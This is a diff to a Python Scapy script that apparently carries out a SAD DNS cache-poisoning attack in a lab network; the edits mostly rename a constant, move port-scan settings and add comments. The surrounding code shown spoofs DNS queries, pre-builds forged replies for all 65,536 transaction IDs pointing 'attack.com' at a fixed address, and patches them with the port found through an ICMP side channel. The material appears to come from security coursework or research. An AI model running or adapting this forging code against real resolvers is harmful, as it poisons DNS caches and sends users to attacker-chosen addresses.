@@ -13,23 +13,23 @@ domain_name = "attack.com"
 # Port that recursive resolver is listening on
 forwarder_port = 53
 # Interface that attacker vm has to network with recursive resolver.
+# This line will error out if script is not run as superuser. Since we are spoofing IP addresses, we need superuser perms.
 global_socket = conf.L2socket(iface='vbox_saddns_net')
+# Range of Ports to Scan
+min_port_scans = 1024
+max_port_scans = 65535
 
 # Constant, icmp limit used for side channel. This number relies on kernel version used.
 ICMP_LIMIT_RATE = 100
 # How long we wait for reeponse that port is unreachable
 ICMP_REPLY_WAIT_TIME = .1
-
-# Range of Ports to Scan
-min_port_scans = 1024
-max_port_scans = 65535
-
 # Initial Request Timemout in seconds, set to very large number to ensure we have time to pulll off the attack.
-dns_query_timeout = 600
+DNS_QUERY_TIMEOUT = 600
 
 # Global Flag
 finished = 0
 
+# Global varibales
 raw_dns_replies = None
 header = None
 
@@ -41,7 +41,7 @@ def dns_query():
     udp_layer = UDP(dport=forwarder_port, sport=my_port)
     dns_layer = DNS(rd=1, qd=DNSQR(qname=domain_name))
     packet = ip_layer / udp_layer / dns_layer
-    ret = sr1(packet, timeout=dns_query_timeout)
+    ret = sr1(packet, timeout=DNS_QUERY_TIMEOUT)
     print (ret.show())
     return
 
@@ -97,6 +97,7 @@ def binary_search(left, right):
     return -1
 
 def prepare_dns_replies(port):
+    # Reference: https://blog.woefe.com/posts/faster_scapy.html
     dns_replies = []
     for txid in range(0, 65536):
         dns_replies.append(
@@ -107,7 +108,6 @@ def prepare_dns_replies(port):
                     qd=DNSQR(qname=domain_name, qtype=0x0001, qclass=0x0001),
                     an=DNSRR(rrname=domain_name, ttl=70000, rdata="255.255.255.255"))
         )
-    # reference https://www.geeksforgeeks.org/struct-module-python/
     raw_dns_replies = []
     for dns_reply in dns_replies:
         raw_dns_replies.append(bytearray(raw(dns_reply)))
@@ -121,6 +121,8 @@ def prepare_dns_replies(port):
     return (raw_dns_replies, header)
 
 def forge_DNS_response(actual_port):
+    '''Updates all pre-prepared responses with proper dport.'''
+    # Reference: https://blog.woefe.com/posts/faster_scapy.html
     global raw_dns_replies, header
     for reply in raw_dns_replies:
         # update actual port
